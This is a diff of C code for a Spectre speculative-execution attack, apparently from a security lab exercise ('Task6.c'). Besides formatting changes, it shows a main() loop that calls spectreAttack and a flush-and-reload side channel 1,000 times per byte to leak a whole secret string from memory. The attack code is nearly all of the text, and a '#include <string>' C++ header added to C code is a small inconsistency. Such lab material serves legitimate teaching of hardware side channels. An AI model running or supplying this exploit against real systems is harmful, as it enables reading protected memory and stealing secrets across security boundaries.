@@ -4,7 +4,7 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <unistd.h>
-
+#include <string>
 
 unsigned int bound_lower = 0;
 unsigned int bound_upper = 9;
@@ -36,7 +36,7 @@ void flushSideChannel()
 }
 
 static int scores[256];
-void reloadSideChannelImproved() //
+void reloadSideChannelImproved()
 {
 int i;
   volatile uint8_t *addr;
@@ -76,22 +76,26 @@ void spectreAttack(size_t index_beyond)
   array[s*4096 + DELTA] += 88;
 }
 
-int main()
-{
+// The change in Task6.c will be in main() here:
+int main() {
     int i;
     uint8_t s;
     int k;
+  
     for (k = 0; k < strlen(secret); k++) //loop over the entire secret string
     {
         size_t larger_x = (size_t)(secret - (char*)buffer) + k;
+      
         flushSideChannel();
         for (i = 0; i < 256; i++)
             scores[i] = 0;
+      
         for (i = 0; i < 1000; i++)
         {
             spectreAttack(larger_x);
             reloadSideChannelImproved();
         }
+      
         int max = 1;
         for (i = 1; i < 256; i++)
         {
